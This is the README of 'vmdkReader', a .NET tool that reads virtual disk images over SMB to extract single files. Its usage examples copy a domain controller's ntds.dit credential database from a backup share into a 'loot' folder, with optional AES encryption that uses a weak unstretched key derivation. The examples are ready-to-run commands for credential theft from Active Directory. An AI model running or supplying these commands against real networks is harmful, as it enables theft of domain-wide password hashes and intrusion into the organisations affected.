# vmdkReader
.Net 4.0 Console App to read and extract files from VMDK, VHD, and VHDX images.

Uses https://github.com/DiscUtils/DiscUtils lib to parse virtual disk images.

Useful in cases where the disk is on the network and you only want to copy a single file instead of GBs (e.g. ntds.dit). DiscUtils performs random-access sector reads so only the NTFS metadata and the target file's data clusters cross the wire — not the whole disk.

**Project uses:**
* Quamotion.DiscUtils.Core
* Quamotion.DiscUtils.Ntfs
* Quamotion.DiscUtils.Streams
* Quamotion.DiscUtils.Vhd
* Quamotion.DiscUtils.Vhdx
* Quamotion.DiscUtils.Vmdk

and ILMerge 3.0.29 & ILMerge.MSBuild.Task to bundle the required dlls.

---

## Commands

The command is the first positional argument. Flags can appear in any order.

### dir
```
vmdk.exe dir -s <disk> [-d <directory>]
```

| Flag | Description |
|---|---|
| `-s` | Virtual disk path (VMDK/VHD/VHDX). Accepts UNC/SMB paths. |
| `-d` | Guest directory to list. Defaults to root if omitted. |

### cp
```
vmdk.exe cp -s <disk> -f <file> -o <destination> [-z] [-p <password>]
```

| Flag | Description |
|---|---|
| `-s` | Virtual disk path (VMDK/VHD/VHDX). Accepts UNC/SMB paths. |
| `-f` | Guest path of the file to extract. |
| `-o` | Local path to write the output file. |
| `-z` | (optional) GZip-compress the output. |
| `-p` | (optional) AES-256-CBC encrypt with password. Combine with `-z` to compress then encrypt. Output uses VMCE format (see below). |

### decrypt
```
vmdk.exe decrypt -s <vmce-file> -o <destination> [-p <password>]
```

| Flag | Description |
|---|---|
| `-s` | Path to the VMCE file to read. |
| `-o` | Local path to write the decrypted output. |
| `-p` | Password. Required if the file was encrypted. |

---

## Examples

```
# Directory listing over SMB
vmdk.exe dir -s \\backupserver\dc01\dc01.vmdk -d \Windows\System32
vmdk.exe dir -s \\backupserver\dc01\dc01.vhdx -d \Windows\System32

# Plain copy
vmdk.exe cp -s \\backupserver\dc01\dc01.vmdk -f \Windows\System32\calc.exe -o C:\loot\calc.exe

# Encrypt only (fast — AES-NI limited, no compression overhead)
vmdk.exe cp -s \\backupserver\dc01\dc01.vhdx -f \Windows\NTDS\ntds.dit -o C:\loot\ntds.vmce -p Sup3rS3cr3t

# Compress then encrypt (smaller output, slower due to GZip)
vmdk.exe cp -s \\backupserver\dc01\dc01.vhdx -f \Windows\NTDS\ntds.dit -o C:\loot\ntds.vmce -z -p Sup3rS3cr3t

# Decrypt
vmdk.exe decrypt -s C:\loot\ntds.vmce -o C:\loot\ntds.dit -p Sup3rS3cr3t
```

---

## VMCE file format

Files written with `--compress` or `--password` use a simple header:

```
[4 bytes]  Magic: "VMCE"
[1 byte]   Flags: bit0=compressed, bit1=encrypted
[16 bytes] Salt  (only when encrypted)
[16 bytes] IV    (only when encrypted)
[N bytes]  AES-256-CBC( GZip( plaintext ) )  — layers depend on flags
```

Key derivation: `SHA-256( UTF8(password) || salt )` — instant, no KDF stretching.
Cipher: AES-256-CBC, hardware-accelerated via AES-NI on supported CPUs.

---

**WARNING — tested only with specific VMDK/VHD/VHDX images. Use at your own risk.**

**TODO**
- Add support for NFS / iSCSI sources
